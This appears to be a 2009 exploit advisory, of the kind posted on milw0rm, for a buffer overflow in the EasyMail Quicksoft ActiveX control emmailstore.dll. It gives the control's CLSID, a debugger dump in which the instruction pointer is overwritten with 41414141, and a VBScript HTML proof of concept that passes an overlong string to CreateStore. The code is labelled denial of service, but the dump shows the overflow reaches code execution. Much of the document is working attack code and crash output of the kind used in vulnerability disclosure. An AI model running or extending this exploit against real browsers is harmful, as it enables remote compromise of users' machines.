@@ -1,0 +1,81 @@
+#####################################################################################
+
+Application:  EasyMail Quicksoft 6.0.2.0
+            
+Platforms:    Windows XP Professional French SP2
+
+crash:	      IE 6.0.2900.2180
+	      
+	
+Exploitation: remote Code Execution
+
+Date:         2009-08-24
+
+Author:       Francis Provencher (Protek Research Lab's)
+             
+
+#####################################################################################
+
+1) Introduction
+2) Technical details and bug
+3) The Code
+
+#####################################################################################
+
+===============
+1) Introduction
+===============
+
+Create, send, download, parse, print and store internet email messages in your classic windows application.  Designed for Visual Basic, ASP, C++, Delphi, ColdFusion, PowerBuilder, Access and other development environments.  COM or standard DLL interfaces.  This is the software that processes hundreds of millions of email messages on the Internet every day.
+
+#####################################################################################
+
+============================
+2) Technical details 
+============================
+
+Name:	emmailstore.dll
+Ver.:	6.0.2.0
+CLSID:	{18A76B9A-45C1-11D3-80DC-00C04F6B92D0}
+
+ModLoad: 10000000 1002c000   C:\WINDOWS\system32\emmailstore.dll
+(1670.59c): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=000002bd ebx=00000000 ecx=0003ea80 edx=00030608 esi=00038790 edi=00000193
+eip=41414141 esp=0013eb44 ebp=0013eb60 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00010206
+41414141 ??              ???
+
+
+
+
+
+#####################################################################################
+
+===========
+3) The Code
+===========
+
+Proof of concept DoS code;
+
+<HTML>
+<object classid='clsid:18A76B9A-45C1-11D3-80DC-00C04F6B92D0' id='target' />
+<script language='vbscript'>
+
+argCount   = 2
+
+arg1=String(402, "A")
+arg2=1
+
+target.CreateStore arg1 ,arg2 
+
+</script>
+<html>
+~
+
+
+
+#####################################################################################
+
+# milw0rm.com [2009-09-15]
